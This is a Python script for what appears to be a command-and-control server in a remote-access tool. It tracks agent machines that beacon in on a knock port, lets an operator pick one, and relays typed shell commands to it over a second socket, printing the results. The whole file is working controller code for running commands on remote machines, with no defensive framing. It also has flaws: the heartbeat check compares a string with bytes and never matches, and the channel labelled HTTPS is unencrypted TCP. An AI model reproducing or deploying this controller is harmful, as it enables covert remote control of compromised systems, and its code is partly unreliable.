import socket
import threading
import time

KNOCK_PORT = 31415
HTTPS_PORT = 31416

HOST = socket.gethostbyname(socket.gethostname())

class ThreadedServer():
    def __init__(self, host):
        self.sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        self.knock_sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.knock_sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        self.sock.bind((host, HTTPS_PORT))
        self.knock_sock.bind((host, KNOCK_PORT))
        self.ping_threads = {}
        self.ping_master = threading.Thread(target=self.listen, args=()).start()
        

    def listen(self):
        self.knock_sock.listen(5)
        while True:
            con, addy = self.knock_sock.accept()
            con.settimeout(10)
            self.ping_threads[addy] = con
            threading.Thread(target=self.handle_health, args=(con,)).start()
            
    
    def handle_health(self, con):
        while True:
            try:
                temp = con.recv(1024).decode()
            except Exception as e:
                pass
            if temp == b'Knock':
                con.send(b'Knock')
    
    def send_start(self, addy):
        print(self.ping_threads)
        print(addy)
        con = self.ping_threads[addy]
        print(con)
        con.send(b'HTTPS Start')
        

    def handle_agent(self):
        self.sock.listen(5)
        con, _ = self.sock.accept()
        con.settimeout(0.25)
        print("HTTPS connct")
        buff = ""
        temp = "______Sending Command______"
        while temp:
            try:
                temp = con.recv(1024).decode()
                buff +=  temp               
            except Exception as e:
                temp = False
        print(buff, end="")
        while True:
            command = input()
            if command == "exit":
                break
            command += "\n"
            con.send(command.encode())
            temp = "______Sending Command______"
            buff = ""
            while temp:
                try:
                    temp = con.recv(1024).decode()
                    buff += temp               
                except Exception as e:
                    temp = False
                    pass
            print(buff, end="")
            


def main():
    t = ThreadedServer(HOST)
    while True:
        print("Please enter selection:")
        print("Listed connected machines - 1")
        print("Select machine to connect to - 2")
        select = input(">")
        if select == "1":
            print(t.ping_threads.keys())
        elif select == "2":
            c = 0
            keys = []
            for s in t.ping_threads.keys():
                print(str(c) + ". " + str(s))
                c += 1
                keys.append(s)
            num = input("Number of box you want to connect to:")
            addy = keys[int(num)]
            t.send_start(addy)
            t.handle_agent()

if __name__ == "__main__":
    main()